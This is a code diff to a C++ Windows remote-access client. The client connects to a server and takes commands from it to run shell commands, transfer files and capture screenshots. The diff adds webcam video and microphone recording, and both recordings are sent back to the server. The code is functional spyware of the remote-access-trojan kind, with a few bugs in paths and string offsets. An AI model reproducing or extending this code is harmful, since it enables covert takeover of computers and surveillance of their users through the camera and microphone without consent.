@@ -5,7 +5,15 @@
 #include <vector>
 #include <windows.h>
 #include <GdiPlus.h>
-
+#include <opencv2\opencv.hpp>
+#include <opencv2\core\core.hpp>
+#include <opencv2\highgui\highgui.hpp>
+#include <SFML/Graphics.hpp>
+#include <SFML/Audio.hpp>
+#include <ctime>
+#include <memory>
+#include <thread>
+#include <filesystem>
 
 #pragma warning(disable:4996)
 
@@ -13,15 +21,18 @@
 
 #pragma comment( lib, "gdiplus" )
 
+
 #ifdef _WIN32
 
 using namespace std;
+using namespace cv;
+using namespace std::experimental::filesystem::v1;
 
-int GetEncoderClsid(const WCHAR *format, CLSID *pClsid);
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 
-void gdiscreen(const wchar_t *avi);
+void gdiscreen(const wchar_t* avi);
 
-void gdiscreen(const wchar_t *avi) {
+void gdiscreen(const wchar_t* avi) {
     using namespace Gdiplus;
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -35,12 +46,12 @@ void gdiscreen(const wchar_t *avi) {
         int Width = GetSystemMetrics(SM_CXSCREEN);
         memdc = CreateCompatibleDC(scrdc);
         membit = CreateCompatibleBitmap(scrdc, Width, Height);
-        HBITMAP hOldBitmap = (HBITMAP) SelectObject(memdc, membit);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
         BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
         Gdiplus::Bitmap bitmap(membit, NULL);
         CLSID clsid;
         GetEncoderClsid(L"image/jpeg", &clsid);
-//        bitmap.Save((IStream *) path, &clsid);
+        //        bitmap.Save((IStream *) path, &clsid);
         bitmap.Save(avi, &clsid);
         SelectObject(memdc, hOldBitmap);
         DeleteObject(memdc);
@@ -50,15 +61,15 @@ void gdiscreen(const wchar_t *avi) {
     GdiplusShutdown(gdiplusToken);
 }
 
-int GetEncoderClsid(const WCHAR *format, CLSID *pClsid) {
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     using namespace Gdiplus;
     UINT num = 0;          // number of image encoders
     UINT size = 0;         // size of the image encoder array in bytes
-    ImageCodecInfo *pImageCodecInfo = NULL;
+    ImageCodecInfo* pImageCodecInfo = NULL;
     GetImageEncodersSize(&num, &size);
     if (size == 0)
         return -1;  // Failure
-    pImageCodecInfo = (ImageCodecInfo *) (malloc(size));
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
     if (pImageCodecInfo == NULL)
         return -1;  // Failure
     GetImageEncoders(num, size, pImageCodecInfo);
@@ -76,16 +87,17 @@ int GetEncoderClsid(const WCHAR *format, CLSID *pClsid) {
 
 void executeCommands(string commands) {
     char ch;
-    FILE *fpipe;
-    FILE *copy_fp;
-    char *command = (char *) commands.c_str();
+    FILE* fpipe;
+    FILE* copy_fp;
+    char* command = (char*)commands.c_str();
     copy_fp = fopen("C:\\C projects\\output_file_path.txt", "w");
-    fpipe = (FILE *) _popen(command, "r");
+    fpipe = (FILE*)_popen(command, "r");
     if (fpipe) {
         while ((ch = static_cast<char>(fgetc(fpipe))) != EOF) {
             fputc(ch, copy_fp);
         }
-    } else {
+    }
+    else {
         if (copy_fp) {
             fprintf(copy_fp, "Sorry there was an error opening the file");
         }
@@ -112,7 +124,7 @@ void send_file_to_server(SOCKET socket, string fileName) {
 
 
 void receive_file_from_server(SOCKET socket, string path) {
-    ofstream file{path, ofstream::binary};
+    ofstream file{ path, ofstream::binary };
     vector<char> buffer(1025, 0);
     int size;
     while (true) {
@@ -128,6 +140,74 @@ void receive_file_from_server(SOCKET socket, string path) {
         file.write(buffer.data(), size);
     }
 }
+
+int cameraCapturing(int seconds) {
+    VideoCapture cap(0); // open the video camera no. 0
+
+    VideoWriter writer;
+
+    VideoWriter();
+
+    if (!cap.isOpened())  // if not success, exit program
+    {
+        cout << "ERROR INITIALIZING VIDEO CAPTURE" << endl;
+        return -1;
+    }
+
+    string windowName = "";
+    namedWindow(windowName, WINDOW_AUTOSIZE); //create a window to display our webcam feed
+
+    //File name string
+    string filename = "C:\\C projects\\test.mp4";
+
+    //fourcc integer
+    int fcc = VideoWriter::fourcc('M', 'P', '4', '2');
+
+    //frames per sec intefer
+    int fps = 30;
+
+    //frame size
+    Size frameSize(cap.get(CAP_PROP_FRAME_WIDTH), cap.get(CAP_PROP_FRAME_HEIGHT));
+
+    writer = VideoWriter(filename, fcc, fps, frameSize);
+
+    time_t currentTime = time(NULL);
+    cout << currentTime << endl;
+    while (time(NULL) != currentTime + seconds + 3) {
+
+        Mat frame;
+        bool bSuccess = cap.read(frame); // read a new frame from camera feed
+
+        if (!bSuccess) //test if frame successfully read
+        {
+            cout << "ERROR READING FRAME FROM CAMERA FEED" << endl;
+            break;
+        }
+        writer.write(frame);
+
+        imshow(windowName, frame); //show the frame in "MyVideo" window
+    }
+    cout << time(NULL) << endl;
+    destroyAllWindows();
+}
+
+
+int capturingAudio(int seconds) {
+    if (!sf::SoundBufferRecorder::isAvailable)
+        return -1;
+
+    sf::SoundBufferRecorder recorder;
+    time_t currentTime = time(NULL);
+    recorder.start();
+    while (time(NULL) != currentTime + seconds + 1) {
+    }
+    recorder.stop();
+    const sf::SoundBuffer & buffer = recorder.getBuffer();
+    buffer.saveToFile("C:\\C projects\\mic output.ogg");
+    return 1;
+}
+
+
 
 
 void Client() {
@@ -161,7 +241,7 @@ void Client() {
     inet_pton(AF_INET, ipAdress.c_str(), &hint.sin_addr);
 
     // Connect to serverT
-    int connResult = connect(sock, (sockaddr *) &hint, sizeof(hint));
+    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
     if (connResult == SOCKET_ERROR) {
         cerr << "Cant connect to server" << WSAGetLastError << endl;
         closesocket(sock);
@@ -188,23 +268,40 @@ void Client() {
                 string error = "Error with " + command + " command";
                 send(sock, error.c_str(), error.size() + 1, 0);
             }
-        } else if (command.find("get file ") == 0) {
+        }
+        else if (command.find("get file ") == 0) {
             command = command.substr(9, command.size() - 1);
             send_file_to_server(sock, command);
-        } else if (command.find("download file ") == 0) {
+        }
+        else if (command.find("download file ") == 0) {
             bytesRecived = recv(sock, buf, 1024, 0);
             string path = string(buf, 0, static_cast<const unsigned int>(bytesRecived));
             receive_file_from_server(sock, path);
-        } else if (command.find("take screenshot ") == 0) {
+        }
+        else if (command.find("take screenshot ") == 0) {
             command = command.substr(16, command.size() - 1);
             wstring path = wstring(command.begin(), command.end());
-            const wchar_t *szName = path.c_str();
+            const wchar_t* szName = path.c_str();
             gdiscreen(szName);
             send_file_to_server(sock, command);
-        } else {
-            string problem{"Cant find the command " + command};
+        }
+        else if (command.find("take mic output") == 0) {
+            command = command.substr(16, command.size() - 1);
+            capturingAudio(stoi(command));
+            send_file_to_server(sock, "C:\\C project\\mic output.ogg");
+        }
+        
+        
+        else if (command.find("take camera video") == 0) {
+            command = command.substr(18 , command.size() -1);
+            cameraCapturing(stoi(command));
+            send_file_to_server(sock, "C:\\C projects\\test.mp4");
+
+        }
+
+        else {
+            string problem{ "Cant find the command " + command };
             send(sock, problem.c_str(), problem.size() + 1, 0);
-            break;
         }
     }
 
@@ -215,5 +312,11 @@ void Client() {
 
 
 int main() {
-    Client();
+    //Client();
+    string path = "C:\\";
+    for (const auto& entry : filesystem::directory_iterator(path)) {
+        std::cout << entry.path() << endl;
+    }
+
 }
+
